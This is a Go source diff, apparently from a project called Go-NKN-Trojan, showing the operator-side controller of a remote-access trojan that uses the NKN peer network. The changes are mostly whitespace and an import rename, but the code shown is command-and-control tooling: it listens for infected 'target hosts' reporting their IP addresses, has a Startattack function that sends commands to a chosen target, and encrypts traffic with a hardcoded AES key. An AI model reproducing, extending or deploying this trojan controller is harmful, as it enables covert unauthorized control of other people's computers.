@@ -1,7 +1,7 @@
 package main
 
 import (
-	"../module/cipher"
+	"Go-NKN-Trojan/Power"
 	"bufio"
 	"crypto/md5"
 	"encoding/hex"
@@ -15,7 +15,7 @@ import (
 	"time"
 )
 
-func main()  {
+func main() {
 	seed := flag.String("g", "", "generate or input new seed")
 	flag.Parse()
 	if *seed == "new" {
@@ -26,9 +26,9 @@ func main()  {
 		}
 		fmt.Println(hex.EncodeToString(account.Seed()))
 		os.Exit(0)
-	} else if *seed == ""{
+	} else if *seed == "" {
 		fmt.Println("Please enter your private seed")
-	} else if len(*seed) != 64{
+	} else if len(*seed) != 64 {
 		fmt.Println("seed is illegal,need length is 64's seed")
 	} else {
 		go Startlisten(*seed)
@@ -49,7 +49,7 @@ func main()  {
 	}
 }
 
-func Startlisten(seedid string)  {
+func Startlisten(seedid string) {
 	err := func() error {
 		seed, _ := hex.DecodeString(seedid)
 		account, err := nkn.NewAccount(seed)
@@ -57,14 +57,14 @@ func Startlisten(seedid string)  {
 			return err
 		}
 		Listener, err := nkn.NewMultiClient(account, "monitor", 4, false, nknconfig)
-		fmt.Println("your control id =",Listener.Address())
+		fmt.Println("your control id =", Listener.Address())
 		if err != nil {
 			return err
 		}
 		<-Listener.OnConnect.C
 		for {
 			msg := <-Listener.OnMessage.C
-			log.Println("target host connect, ID:", msg.Src,",target IP address :",string(msg.Data))
+			log.Println("target host connect, ID:", msg.Src, ",target IP address :", string(msg.Data))
 			msg.Reply([]byte("OK"))
 		}
 	}()
@@ -73,7 +73,7 @@ func Startlisten(seedid string)  {
 	}
 }
 
-func Startattack( goal string, command string){
+func Startattack(goal string, command string) {
 	account, err := nkn.NewAccount(nil)
 	if err != nil {
 		log.Println(err)
@@ -107,7 +107,7 @@ func RandomID() string {
 }
 
 func AesEncode(str string) []byte {
-	encode, err := cipher.AesCbcEncrypt([]byte(str), []byte("-=[].!@#$%^&*()_+{}|:<>?"))
+	encode, err := Power.AesCbcEncrypt([]byte(str), []byte("-=[].!@#$%^&*()_+{}|:<>?"))
 	if err != nil {
 		fmt.Println(err)
 	}
